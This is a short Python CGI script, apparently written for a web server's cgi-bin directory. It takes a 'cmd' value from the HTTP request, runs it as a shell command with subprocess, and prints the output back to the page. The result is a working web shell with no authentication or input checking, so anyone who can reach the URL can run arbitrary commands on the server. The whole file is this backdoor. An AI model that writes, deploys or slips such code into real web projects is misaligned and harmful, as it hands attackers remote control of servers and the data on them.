#!/bin/python3
#this file will be in cgi-bin directory
# run "chmod +x cmdl.py" in order to make the file executable

print("content:text/html")
print()

import cgi
import subprocess
data=cgi.FieldStorage()
command=data.getvalue("cmd")
print(command)
output=subprocess.getstatusoutput("{}".format(command))
print(output[1])